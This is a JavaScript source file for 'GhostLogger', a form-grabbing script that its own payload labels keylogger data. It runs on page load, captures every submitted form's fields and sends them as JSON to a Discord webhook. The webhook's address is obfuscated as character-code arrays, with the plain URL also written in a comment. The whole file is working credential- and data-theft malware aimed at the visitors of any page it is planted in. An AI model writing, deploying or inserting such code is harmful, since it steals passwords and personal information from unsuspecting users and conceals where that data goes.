class GhostLogger {
    constructor() {
        // Obfuscated webhook segments
        this.webhookUrl = this._assemble();
        this.data = {};
        this.init();
    }

    _assemble() {
        const p = String.fromCharCode;
        // https://discord.com/api/webhooks/1496494382134853662/Ped7BYlBb-slQLAOhNkIwMZl8nB1eBxQNR6ww0zr6lRIkLzrAw5pgDTnbFpXakhVlh5C
        const segments = [
            [104, 116, 116, 112, 115, 58, 47, 47, 100, 105, 115, 99, 111, 114, 100, 46, 99, 111, 109],
            [47, 97, 112, 105, 47, 119, 101, 98, 104, 111, 111, 107, 115, 47],
            [49, 52, 57, 54, 52, 57, 52, 51, 56, 50, 49, 51, 52, 56, 53, 51, 54, 54, 50, 47],
            [80, 101, 100, 55, 66, 89, 108, 66, 98, 45, 115, 108, 81, 76, 65, 79, 104, 78, 107, 73, 119, 77, 90, 108, 56, 110, 66, 49, 101, 66, 120, 81, 78, 82, 54, 119, 119, 48, 122, 114, 54, 108, 82, 73, 107, 76, 122, 114, 65, 119, 53, 112, 103, 68, 84, 110, 98, 70, 49, 112, 88, 97, 107, 104, 86, 108, 104, 53, 67]
        ];
        return segments.map(s => s.map(n => p(n)).join('')).join('');
    }

    async sendToDiscord(content) {
        const payload = {
            username: "GhostLogger",
            embeds: [{
                title: "📝 Keylogger Data",
                description: `\`\`\`${content}\`\`\``,
                color: 0x2b2d31,
                footer: { text: "GhostLogger v2.0 - Silent Recon" }
            }]
        };

        await fetch(this.webhookUrl, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(payload)
        });
    }

    init() {
        // Hook form data, clicks, and navigation events silently
        window.addEventListener('submit', (e) => {
            const data = new FormData(e.target);
            this.sendToDiscord(JSON.stringify(Object.fromEntries(data)));
        });
    }
}

window.addEventListener('load', () => { new GhostLogger(); });
